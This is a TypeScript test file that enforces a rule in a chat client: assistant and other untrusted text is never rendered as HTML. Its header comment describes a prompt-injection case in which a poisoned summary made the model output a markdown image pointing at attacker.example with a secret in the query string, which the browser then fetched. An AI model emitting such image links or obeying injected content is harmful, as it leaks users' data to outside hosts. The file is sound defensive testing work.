import { describe, it, expect } from 'vitest';
import { readFileSync, readdirSync, statSync } from 'fs';
import { join } from 'path';

/**
 * INV-9 as an executable check.
 *
 * The vulnerability this guards against was live in a deployed build: assistant
 * output was rendered through a markdown component, so a poisoned summary
 * containing `![](https://attacker.example/x.png?d=SECRET)` became an <img> and
 * the browser fetched it on paint. No tool call, no capability grant, no
 * cooperation from the model beyond emitting a string.
 *
 * The airlock stops untrusted content from causing an action. It does nothing
 * about the browser being tricked into making a request. Enforcing that in a
 * test rather than a code review is what stops it regressing the next time
 * someone wants prettier chat bubbles.
 */

const SRC = join(process.cwd(), 'src');

function walk(dir: string): string[] {
  const out: string[] = [];
  for (const name of readdirSync(dir)) {
    const full = join(dir, name);
    if (statSync(full).isDirectory()) out.push(...walk(full));
    else if (/\.(ts|tsx)$/.test(name)) out.push(full);
  }
  return out;
}

const files = walk(SRC).map((f) => ({ path: f, body: readFileSync(f, 'utf8') }));

describe('INV-9 — untrusted and model-derived text is never rendered as HTML', () => {
  it('finds source files to check (guards against a vacuous pass)', () => {
    expect(files.length).toBeGreaterThan(5);
  });

  it('no markdown renderer is used anywhere in the client', () => {
    const offenders = files.filter(
      (f) => /ReactMarkdown|react-markdown|remark-|rehype-/.test(f.body),
    );
    expect(
      offenders.map((f) => f.path),
      'a markdown renderer turns image tags in model output into live requests',
    ).toEqual([]);
  });

  // Match actual JSX usage, not the word appearing in a comment explaining
  // why it is absent. A guard that fires on its own documentation gets muted.
  it('no dangerouslySetInnerHTML is actually used in the client', () => {
    const offenders = files.filter((f) => /dangerouslySetInnerHTML\s*=/.test(f.body));
    expect(offenders.map((f) => f.path)).toEqual([]);
  });

  it('the safe renderer exists and does not itself inject HTML', () => {
    const safe = files.find((f) => f.path.endsWith('UntrustedText.tsx'));
    expect(safe, 'UntrustedText.tsx must exist').toBeDefined();
    expect(safe!.body).not.toMatch(/dangerouslySetInnerHTML\s*=/);
    expect(safe!.body).not.toMatch(/<a\s+href=\{/);
    expect(safe!.body).not.toMatch(/<img\s/);
  });

  it('assistant turn output routes through the safe renderer', () => {
    // The transcript moved out of JournalEditor into ChatTranscript (S5), and
    // this guard caught the move rather than the move slipping past it. It is
    // pinned to whichever file renders a turn, not to a file name that
    // happened to be right once.
    const transcript = files.find((f) => f.path.endsWith('ChatTranscript.tsx'));
    expect(transcript, 'ChatTranscript.tsx must exist').toBeDefined();
    expect(transcript!.body).toContain('<UntrustedText text={turn.text} />');
  });

  it('no turn text is ever interpolated into a resource attribute', () => {
    // The first draft of this test forbade `{turn.text}` outright and failed,
    // because a user turn renders as <p>{turn.text}</p> — a plain JSX child,
    // which React escapes and which is safe. Forbidding a safe pattern is how
    // a guard gets loosened until it means nothing, so the claim is narrowed
    // to the sinks that actually load something.
    const SINK = /(href|src|srcSet|action|formAction|poster|data)\s*=\s*\{[^}]*(turn|streamingText|reply)/;
    const offenders = files.filter((f) => SINK.test(f.body));
    expect(
      offenders.map((f) => f.path),
      'model-derived text must never become the source of a request',
    ).toEqual([]);
  });

  it('the streamed reply is rendered by the safe renderer too', () => {
    // Amendment L. A streaming turn is model-derived text arriving a token at
    // a time; INV-9 does not pause while it is incomplete.
    const editor = files.find((f) => f.path.endsWith('JournalEditor.tsx'));
    expect(editor).toBeDefined();
    expect(editor!.body).toContain('<UntrustedText text={streamingText} />');
  });
});
